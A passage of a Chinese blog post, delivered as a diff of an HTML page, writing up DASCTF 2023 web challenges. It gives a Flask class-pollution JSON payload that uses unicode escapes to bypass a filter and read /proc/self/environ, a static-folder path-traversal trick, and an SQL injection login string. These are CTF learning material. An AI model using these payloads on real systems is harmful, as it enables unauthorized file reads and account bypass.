@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="又能学到很多不知道的知识 满足感up up up!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF 2023 &amp; 0X401七月暑期挑战赛 部分WEB复现与学习">
+<meta property="og:url" content="http://example.com/post/731522c3.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="又能学到很多不知道的知识 满足感up up up!">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184393793-d0a681ee-d952-4ce1-a399-3b4569f5cfef.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184461558-65c4f6b7-4253-4e53-8b18-fb8274dba2d4.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690185307308-a0208406-53ea-4081-b105-873fc05a2830.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284296888-8b13e482-f7af-4f9f-9692-14afbbc72175.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284418928-34e41ed9-ef4a-46b1-9611-bca266194f9f.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284835271-ef78e974-b80b-42d8-ba3a-198e46ed4719.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284900264-277755df-bda5-45f3-8a7d-7ffc1906ae9e.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690190505171-21e3d749-3951-4d74-ab6a-360007a73ddf.png">
+<meta property="article:published_time" content="2023-07-25T11:44:13.000Z">
+<meta property="article:modified_time" content="2023-07-25T11:46:56.673Z">
+<meta property="article:author" content="Z1d10t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png">
+
+
+<link rel="canonical" href="http://example.com/post/731522c3.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/731522c3.html","path":"post/731522c3.html","title":"DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习 | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#EzFlask"><span class="nav-number">1.</span> <span class="nav-text">EzFlask</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">预期解：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.</span> <span class="nav-text">非预期</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A%E6%B1%A1%E6%9F%93-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">第一种：污染__**file__**任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D-%E6%B1%A1%E6%9F%93-static-folder-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A"><span class="nav-number">1.2.2.</span> <span class="nav-text">第二种: 污染 _static_folder  路径穿越</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MyPicDisk"><span class="nav-number">2.</span> <span class="nav-text">MyPicDisk</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-cms"><span class="nav-number">3.</span> <span class="nav-text">ez_cms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-py"><span class="nav-number">4.</span> <span class="nav-text">ez_py</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-timing"><span class="nav-number">5.</span> <span class="nav-text">ez_timing</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">Keep Hacking</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">84</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/731522c3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="Keep Hacking">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习 | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-07-25 19:44:13 / 修改时间：19:46:56" itemprop="dateCreated datePublished" datetime="2023-07-25T19:44:13+08:00">2023-07-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>又能学到很多不知道的知识 满足感up up up!</p>
+<span id="more"></span>
+
+<h1 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h1><p>跟标题就是flask有关的 进入题目直接给了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
+
+<p>大致看一眼 经典的python原型链污染 当时做的时候也成功登录了 </p>
+<p>但是我不知道污染哪里这个题目 应该是我没见过的知识点</p>
+<h2 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h2><p>其实最重要的一部分我反而没有看到 qwq </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><code>__file__</code>：当前脚本运行的路径 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png" alt="img"></p>
+<p>这里我们如果能污染__file__值 那么我们就可以读取任意文件了</p>
+<p>还有就是这题开了pin 而且还有个<code>/console</code>路由 这是咋发现的真离谱</p>
+<p>然后是黑名单waf了<code>__init__</code></p>
+<p>在check()之后是进行了一次json.loads的，而json识别unicode  所以可以用unicode编码进行bypass</p>
+<p>预期解就是利用任意文件读取然后计算pin码 就可以getshell了</p>
+<p>这里就不赘述了</p>
+<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>真正学习的是非预期</p>
+<p>这里有两种payload:</p>
+<h3 id="第一种：污染-file-任意文件读取"><a href="#第一种：污染-file-任意文件读取" class="headerlink" title="第一种：污染__**file__**任意文件读取"></a>第一种：污染__**file__**任意文件读取</h3><p>前面也说过原理了 只要我们将__file__污染为我们想读取的文件名即可</p>
+<p>直接读环境变量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/self/environ&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184393793-d0a681ee-d952-4ce1-a399-3b4569f5cfef.png" alt="img"></p>
+<p>然后访问<code>/</code> 出题人环境变量中的flag忘删了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184461558-65c4f6b7-4253-4e53-8b18-fb8274dba2d4.png" alt="img"></p>
+<h3 id="第二种-污染-static-folder-路径穿越"><a href="#第二种-污染-static-folder-路径穿越" class="headerlink" title="第二种: 污染 _static_folder  路径穿越"></a>第二种: 污染 _static_folder  路径穿越</h3><p>首先来看看<code> _static_folder</code> </p>
+<p>flask init文件部分代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        import_name,</span></span><br><span class="line"><span class="params">        static_url_path=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        static_folder=<span class="string">&#x27;static&#x27;</span>,</span></span><br><span class="line"><span class="params">        static_host=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        host_matching=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        subdomain_matching=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        template_folder=<span class="string">&#x27;templates&#x27;</span>,</span></span><br><span class="line"><span class="params">        instance_path=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        instance_relative_config=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        root_path=<span class="literal">None</span></span></span><br><span class="line"><span class="params">    </span>):</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>static_folder=&#39;static&#39;</code> 默认是在static文件也即是默认的静态文件的位置  </p>
+<p>我的理解是 我们<code>static_folder</code>可以指定静态文件的位置 并且我们可以访问 一般我们做题都有注意到我们可以访问static目录 </p>
+<p>那么 如果我们污染<code>_static_folder</code>让他的路径为<code>/</code> 那么我们是不是可以根目录下的所有文件了 </p>
+<p>因此我们就可以路径穿越了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690185307308-a0208406-53ea-4081-b105-873fc05a2830.png" alt="img"></p>
+<p>注意一下路径<code>/static/proc/1/environ</code></p>
+<h1 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h1><p>这道题目 如何上传文件的同时并且post数据 我尬住了 不太会 额额额 抽象</p>
+<p>然后赛后看了师傅们的wp 真的太强辣</p>
+<p>首先用户名存在万能钥匙登录 <code>admin&#39; or 1=1#</code> 就可以登录了 </p>
+<p>然后存在源码泄露<code>/y0u_cant_find_1t.zip</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span 